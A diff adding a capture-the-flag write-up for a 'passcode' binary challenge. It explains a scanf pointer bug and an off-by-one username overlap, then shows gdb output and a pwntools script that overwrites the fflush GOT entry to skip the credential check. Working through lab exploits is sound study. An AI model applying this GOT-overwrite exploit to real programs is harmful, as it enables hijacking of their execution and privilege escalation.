@@ -112,3 +112,49 @@ def main(arguments):
     p.send(b'A'* 0x2c + b'B' * 8 + p32(check) + b'\n')
     p.interactive()
 ~~~
+
+### passcode
+This binary appears to have some `scanf` vulnerabilities, hinted at by the comments in the source code.  Running `clang passcode.c -o passcode` illuminates this hint with `clang`'s warning flags: 
+
+~~~bash
+passcode.c:9:14: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
+        scanf("%d", passcode1);
+               ~~   ^~~~~~~~~
+passcode.c:14:21: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
+        scanf("%d", passcode2);
+~~~
+
+The key to this vulnerability is that the `passcode` values are stored as integers on the stack within the `login` function. `scanf` will attempt to store user input at the memory address pointed to by the stack values.  Running the program in gdb shows that `passcode1` attemps to store the value at an address in glibc, which does not have write privileges: 
+
+~~~gdb 
+[-------------------------------------code-------------------------------------]
+   0x804857c <login+24>:        mov    edx,DWORD PTR [ebp-0x10]
+   0x804857f <login+27>:        mov    DWORD PTR [esp+0x4],edx
+   0x8048583 <login+31>:        mov    DWORD PTR [esp],eax
+=> 0x8048586 <login+34>:        call   0x80484a0 <__isoc99_scanf@plt>
+   0x804858b <login+39>:        mov    eax,ds:0x804a02c
+[------------------------------------stack-------------------------------------]
+0000| 0xfff2b6f0 --> 0x8048783 --> 0x65006425 ('%d')
+0004| 0xfff2b6f4 --> 0xf7631cab (<puts+11>:     add    ebx,0x152355)
+~~~
+
+This will cause a segmentation fault when executed.  However, some simple testing shows that the username queried prior to `login` can be used to alter some stack values, which are later retrieved during the `login` function.  The `welcome` function accepts a full 100 characters using `scanf` and stores the input in a 100 character stack buffer.  This has an off-by-one error, as `scanf` accepts the full 100 characters and then adds a trailing null byte.  This is perfect for our uses, since the final four bytes of username input coincide with the stack address where `passcode1` is eventually stored.  This gives us control to change the pointer where the `passcode1` input will be stored with the username input.  We want to control execution flow to call the instructions after the credential checks in `login`, and a great target to hijack execution is using the GOT address for `fflush`, since it is called immediately after `passcode1` is retrieved.  We can retrieve the GOT address using pwntools and send it in as the last four bytes of our username.  Then, we overwrite this GOT address with the address of the validated login instructions.  Note that this address should be passed in as a string of integers, since `scanf` expects a string input of decimal numbers.  The following short script accomplishes this goal and gains elevated privileges to cat the flag.
+
+~~~python
+from pwn import *
+
+def exploit():
+        p = process('/home/passcode/passcode')
+        e = ELF('/home/passcode/passcode')
+        fflush_got_addr = e.got['fflush']
+        login_addr = 0x80485d7
+        print (hex(fflush_got_addr), login_addr)
+        p.send(b"A" * 96 + p32(fflush_got_addr) + str(login_addr))
+        print(p.recv)
+
+        p.interactive()
+
+if __name__ == "__main__":
+        context.log_level = 'debug'
+        exploit()
+~~~
